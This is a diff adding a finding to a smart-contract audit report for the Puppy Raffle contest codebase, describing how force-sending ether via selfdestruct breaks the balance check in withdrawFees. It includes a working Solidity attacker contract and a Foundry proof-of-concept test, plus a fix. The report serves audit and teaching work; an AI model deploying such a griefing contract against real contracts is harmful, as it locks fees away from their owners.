@@ -344,6 +344,152 @@ function enterRaffle(address[] memory newPlayers) public payable {
 
 ---
 
+## withdrawFees uses contract balance in a check
+
+### Severity
+
+Medium risk
+
+### Relevant GitHub Links
+
+[https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L158](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L158)
+
+## Summary
+
+The `PuppyRaffle::withdrawFees` function uses the balance of the smart contract inside a require. An attacker can sending eth to the contract through a selfdestruct.
+
+## Vulnerability Details
+
+The `PuppyRaffle::withdrawFees` check if there are active players by checking the difference between the smart contract balance and the total fees.
+
+```solidity
+    function withdrawFees() external {
+@>      require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
+        uint256 feesToWithdraw = totalFees;
+        totalFees = 0;
+        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
+        require(success, "PuppyRaffle: Failed to withdraw fees");
+    }
+```
+
+An attacker can create a contract and send a smaller value to `entranceFee` via the `selfdestruct` function, thus blocking the contract and no longer being able to collect the fees.
+
+I verify the vulnerability with a test:
+
+- I created an attacker contract called `Attacker.sol` in `src` folder
+
+<details>
+<summary>Contract code</summary>
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.7.6;
+
+import {Test, console} from "forge-std/Test.sol";
+import {PuppyRaffle} from "./PuppyRaffle.sol";
+
+contract Attacker {
+    PuppyRaffle contractToAttack;
+
+    constructor(address _raffle) {
+        contractToAttack = PuppyRaffle(_raffle);
+    }
+
+    function SelfDestructAttack() public {
+        selfdestruct(payable(address(contractToAttack)));
+    }
+}
+```
+
+</details>
+
+- I created a test called `SelfDestruct.t.sol` inside `test` folder, where I verify `withdrawFees` function works inside the `testWithdrawFees` test, and in the `testSelfDestruct` test I called `attacker.SelfDestructAttack();` before `withdrawFees` and check that the function reverts.
+
+<details>
+<summary>Test code</summary>
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.7.6;
+pragma experimental ABIEncoderV2;
+
+import {Test, console} from "forge-std/Test.sol";
+import {PuppyRaffle} from "../src/PuppyRaffle.sol";
+import {Attacker} from "../src/Attacker.sol";
+
+contract SelfDestructTest is Test {
+    PuppyRaffle puppyRaffle;
+    Attacker attacker;
+    uint256 entranceFee = 1e18;
+    address playerOne = address(1);
+    address playerTwo = address(2);
+    address playerThree = address(3);
+    address playerFour = address(4);
+    address feeAddress = address(99);
+    uint256 duration = 1 days;
+
+    function setUp() public {
+        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
+        attacker = new Attacker(address(puppyRaffle));
+        vm.deal(address(attacker), 5 ether);
+    }
+
+    modifier playersEntered() {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+        _;
+    }
+
+    function testWithdrawFees() public playersEntered {
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;
+
+        puppyRaffle.selectWinner();
+        puppyRaffle.withdrawFees();
+        assertEq(address(feeAddress).balance, expectedPrizeAmount);
+    }
+
+    function testSelfDestruct() public playersEntered {
+        console.log("init", address(puppyRaffle).balance);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        attacker.SelfDestructAttack();
+
+        console.log("after", address(puppyRaffle).balance);
+
+        puppyRaffle.selectWinner();
+
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+    }
+}
+```
+
+</details>
+
+## Impact
+
+In the event that ´entranceFee´ is for example `1 ether`, if the attacker adds `0.5 ether` to the balance of the contract with the `selfdestruct` function, the `withdrawFees` function will never allow the move the fees to the `feeAddress` address.
+
+## Tools Used
+
+- Foundry
+- Manual review
+
+## Recommendations
+
+It is recommended not to use the smart contract balance, `address(this).balance` in this case, in the controls, but to use a dedicated variable.
+
+---
+
 ## raffleDuration should be immutable
 
 ### Severity
